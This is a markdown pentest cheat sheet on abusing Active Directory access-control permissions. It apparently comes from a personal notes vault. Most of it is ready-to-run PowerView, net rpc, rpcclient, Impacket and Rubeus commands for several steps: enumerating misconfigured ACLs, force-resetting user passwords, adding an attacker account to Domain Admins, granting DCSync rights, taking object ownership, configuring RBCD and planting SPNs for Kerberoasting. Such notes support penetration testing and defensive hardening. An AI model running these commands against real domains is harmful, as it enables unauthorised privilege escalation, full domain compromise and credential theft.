---
tags:
  - Active_Directory
  - BloodHound
  - Foundational
  - LDAP
  - PowerShell
  - Privilege_Escalation
  - Windows
---

## AD Object Permission Theory
resources: [SpecterOps - ACL Attacks](https://specterops.io/wp-content/uploads/sites/3/2022/06/an_ace_up_the_sleeve.pdf)

> [!info] AD objects have Access Control Lists (ACLs) defining who can do what. Misconfigured ACLs enable privilege escalation.

### Dangerous Permissions
> [!danger] High-risk permissions to look for:
> - **GenericAll** - Full control over object
> - **GenericWrite** - Write all properties
> - **WriteDACL** - Modify object's ACL
> - **WriteOwner** - Change object owner
> - **ForceChangePassword** - Reset password without knowing current
> - **AddMember** - Add members to group

### Enumerate ACLs [Remote]
```powershell
Get-DomainObjectAcl -Identity <ObjectName> -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner" }
```

### Find Interesting ACLs [Remote]
```powershell
Find-InterestingDomainAcl -ResolveGUIDs
```

### BloodHound ACL Analysis
> [!tip] Import data and query for ACL-based attack paths using **BloodHound**.

## Abusing GenericAll

### GenericAll on User
> [!tip] Can reset password, set SPN (Kerberoast), modify attributes.

```powershell
# Reset password
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)
```

```bash
net rpc password <TargetUser> 'NewPassword123!' -U <Domain>/<User>%<Password> -S <DC>
```

### GenericAll on Group
> [!tip] Can add self or others to group.

```powershell
Add-DomainGroupMember -Identity "Domain Admins" -Members <AttackerUser>
```

```bash
net rpc group addmem "Domain Admins" <AttackerUser> -U <Domain>/<User>%<Password> -S <DC>
```

### GenericAll on Computer
> [!tip] Can configure RBCD, read LAPS password.

```powershell
# Configure RBCD
Set-DomainObject -Identity <TargetComputer> -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

## Abusing WriteDACL

### Grant Yourself GenericAll [Remote]
```powershell
Add-DomainObjectAcl -TargetIdentity <TargetObject> -PrincipalIdentity <AttackerUser> -Rights All
```

### Grant DCSync Rights [Remote]
```powershell
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity <AttackerUser> -Rights DCSync
```

### Impacket dacledit [Local]
```bash
impacket-dacledit -action write -rights FullControl -principal <AttackerUser> -target <TargetObject> <Domain>/<User>:<Password>
```

## Abusing WriteOwner

### Take Ownership [Remote]
```powershell
Set-DomainObjectOwner -Identity <TargetObject> -OwnerIdentity <AttackerUser>
```

### Then Grant Yourself Rights
```powershell
Add-DomainObjectAcl -TargetIdentity <TargetObject> -PrincipalIdentity <AttackerUser> -Rights All
```

## Abusing ForceChangePassword

### Reset Password Without Current [Remote]
```powershell
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
```

```bash
rpcclient -U "<Domain>/<User>%<Password>" <DC> -c "setuserinfo2 <TargetUser> 23 'NewPass123!'"
```

## Kerberoastable User Creation

### Add SPN to User with GenericAll/GenericWrite [Remote]
```powershell
Set-DomainObject -Identity <TargetUser> -Set @{serviceprincipalname='fake/service'}
```

### Then Kerberoast [Remote]
```cmd
Rubeus.exe kerberoast /user:<TargetUser> /outfile:hash.txt
```

### Remove SPN (Cleanup) [Remote]
```powershell
Set-DomainObject -Identity <TargetUser> -Clear serviceprincipalname
```
